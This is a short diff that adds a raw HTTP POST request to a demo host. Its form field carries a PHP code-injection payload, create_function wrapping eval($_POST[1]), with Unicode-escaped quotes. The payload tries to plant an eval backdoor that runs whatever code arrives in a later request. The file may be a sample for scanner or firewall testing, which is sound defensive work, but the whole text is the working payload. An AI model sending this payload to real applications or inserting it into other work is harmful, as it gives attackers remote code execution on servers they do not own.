@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 74
+Connection: close
+
+redirect=create_function(\u0027$a\u0027,\u0027eval($_POST[1])\u0027)\u003B
